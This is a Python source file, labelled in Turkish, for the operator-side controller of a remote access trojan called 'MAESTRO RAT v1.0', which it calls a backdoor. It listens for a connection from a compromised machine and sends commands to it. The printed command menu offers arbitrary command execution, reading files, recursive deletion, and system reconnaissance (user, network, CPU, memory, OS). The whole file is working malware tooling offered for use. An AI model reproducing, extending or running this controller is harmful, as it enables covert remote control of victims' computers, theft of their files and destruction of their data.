import socket
import argparse
from colorama import Fore, Style

print(Fore.RED + """
    ⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣷⣦⣄        
    ⠀⠀⣀⣤⣶⣶⣦⣄⠀⠈⣿⣿⣿⣿⡆            
    ⠶⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⣷                 
    ⠀⠈⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄                      
    ⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⣤⣤⣤⡤              
    ⠀⠀⢀⣠⣤⣼⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣤⣤    created by ramo
    ⠐⠺⠿⢿⣿⣿⣿⣿⣿⡏⢸⡿⠋⠀⣼⠏⣿⣿⣿⣿⡿⠟⠉
    ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⣄⣀⡠⠞⠁               """)

print(Fore.RED + """
       MAESTRO RAT v1.0 
       
       
                       """)

def print_command_list():
    print(f"{Fore.GREEN}Backdoor Komut Listesi:{Style.RESET_ALL}")
    print(f"1. {Fore.CYAN}exit{Style.RESET_ALL}: Sunucu bağlantısını sonlandırır.")
    print(f"2. {Fore.CYAN}execute{Style.RESET_ALL}: Belirli bir terminal komutunu sunucuda çalıştırır.")
    print(f"3. {Fore.CYAN}cat [dosya_adı]{Style.RESET_ALL}: Belirtilen dosyanın içeriğini sunucudan istemciye gönderir.")
    print(f"4. {Fore.CYAN}rm [dosya_adı]{Style.RESET_ALL} veya {Fore.CYAN}rm -r [dosya_adı]{Style.RESET_ALL}: Belirtilen dosyayı veya dizini siler.")
    print(f"5. {Fore.CYAN}ls{Style.RESET_ALL} veya {Fore.CYAN}dir{Style.RESET_ALL}: Sunucudaki mevcut dizinin içeriğini listeler.")
    print(f"6. {Fore.CYAN}cd [hedef_klasör]{Style.RESET_ALL}: Sunucudaki çalışma dizinini değiştirir.")
    print(f"7. {Fore.CYAN}mkdir [klasör_adı]{Style.RESET_ALL}: Yeni bir klasör oluşturur.")
    print(f"8. {Fore.CYAN}touch [dosya_adı]{Style.RESET_ALL} veya {Fore.CYAN}type nul > [dosya_adı]{Style.RESET_ALL}: Yeni bir dosya oluşturur.")
    print(f"9. {Fore.CYAN}echo [metin] >> [dosya_adı]{Style.RESET_ALL}: Belirtilen dosyanın sonuna metin ekler.")
    print(f"10. {Fore.CYAN}whoami{Style.RESET_ALL}: Sunucuda oturum açmış kullanıcıyı döndürür.")
    print(f"11. {Fore.CYAN}ifconfig{Style.RESET_ALL}: Sunucunun ağ bilgilerini döndürür.")
    print(f"12. {Fore.CYAN}cpu{Style.RESET_ALL}: Sunucunun CPU bilgilerini döndürür.")
    print(f"13. {Fore.CYAN}memory{Style.RESET_ALL}: Sunucunun bellek kullanım bilgilerini döndürür.")
    print(f"14. {Fore.CYAN}osinfo{Style.RESET_ALL}: Sunucunun işletim sistemi bilgilerini döndürür.")

def main():
    parser = argparse.ArgumentParser(description='MAESTRO RAT v1.0 - Arka Kapı')
    parser.add_argument('-lhost', dest='ip', help='Hedef IP adresi', required=True)
    parser.add_argument('-lport', dest='port', help='Hedef port numarası', required=True)
    args = parser.parse_args()

    ip = args.ip
    port = int(args.port)
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((ip, port))  
        s.listen(1)  
        print(f"{Fore.RED}{ip}:{port} dinleniyor...")

        conn, addr = s.accept()  
        print(f"{Fore.GREEN}Bağlantı alındı: {addr}")

        
        print_command_list()

        while True:
            komut = input("Komutu giriniz ('exit' yazarak çıkabilirsiniz): ") 
            conn.send(komut.encode()) 

            if komut == 'exit':
                break

            if komut.strip() == 'execute':  
                print("Lütfen 'execute' komutu için bir komut girin:")
                islem = input()
                conn.send(islem.encode())
            else:
                received_data = conn.recv(8192)  
                print(received_data.decode(errors='ignore')) 

        conn.close() 

if __name__ == "__main__":
    main()
